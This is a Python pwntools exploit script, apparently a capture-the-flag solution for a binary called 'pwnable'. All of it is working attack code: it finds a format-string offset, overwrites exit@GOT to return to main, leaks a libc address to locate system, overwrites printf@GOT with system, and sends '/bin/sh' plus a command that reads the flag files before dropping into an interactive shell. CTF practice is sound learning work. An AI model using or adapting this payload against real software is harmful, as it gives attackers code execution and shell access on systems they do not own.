from pwn import *

binary = ELF("./pwnable", checksec = False)

def offset_finder():
    # By using this function we can find out that our input is stored at offset eleven of the stack

    for x in range (1, 100):
        p = process("./pwnable")
        # p = remote("stack.overflow.fail", 9002)
        
        print "Offset number {}".format(x)

        payload = ""
        payload += "B" * 2
        payload += "A" * 4
        payload += "%{}$p".format(x)

        p.sendline(payload)
        
        p.recvuntil("Give me a string to echo back.\n")
        stack_value = p.recvline()[6:-1]
        if stack_value.find("637") != -1:
            print "Offset found!"
            print "Stack value: {}".format(stack_value)
            break
        else:
            print "Stack value: {}".format(stack_value)
            
        p.close()

def exploit():
    p = process("./pwnable")
    # p = remote("127.0.0.1", 1338)
    main_addr = 0x0804851b
    exit_got = 0x804a01c
    
    payload = "A" * 2
    payload += p32(exit_got)
    payload += p32(exit_got + 2)
    payload += "%11${}p".format(0x851b - len(payload))
    payload += "%11$hn"
    payload += "%{}p".format(0x10804 - 0x851b)
    payload += "%12$hn"
    #gdb.attach(p, """
    #            b *main+120
    #            b *main+133
    #            c
    #            """)
    p.sendline(payload)
    p.recvuntil("Give me a string to echo back.\n")

    payload = ""
    payload += "%59$p"   
    p.sendline(payload)
    p.recvuntil("Give me a string to echo back.\n")
    
    libc_start_main = int(p.recvline()[:-1], 16)
    log.info("Libc leak : 0x{0:x}".format(libc_start_main))
    libc_base = libc_start_main - 0x018e81 
    log.info("Libc base : 0x{0:x}".format(libc_base))
    libc_system = libc_base + 0x03d200
    log.info("Libc system : 0x{0:x}".format(libc_system))

    printf_got = binary.symbols["got.printf"]
    log.info("Printf@got: {}".format(hex(printf_got)))
    overwrite = str(hex(libc_system))[2:]
    first_overwrite = int(overwrite[4:], 16)
    log.info("First overwrite: {} or in hex {}".format(first_overwrite, hex(first_overwrite)))
    second_overwrite = int(overwrite[:4], 16)
    log.info("Second overwrite: {} or in hex {}".format(second_overwrite, hex(second_overwrite)))

    payload = ""
    payload += "A" * 2
    payload += p32(printf_got)
    payload += p32(printf_got + 2)
    payload += "%11${}p".format(first_overwrite - len(payload))
    payload += "%11$hn"
    payload += "%{}p".format(second_overwrite - first_overwrite)
    payload += "%12$hn"

    p.sendline(payload)
    sleep(1)
    p.sendline("/bin/sh")
    p.sendline("ls -la && cat f*")
    p.interactive()

if __name__ == "__main__":
    #offset_finder()
    exploit()
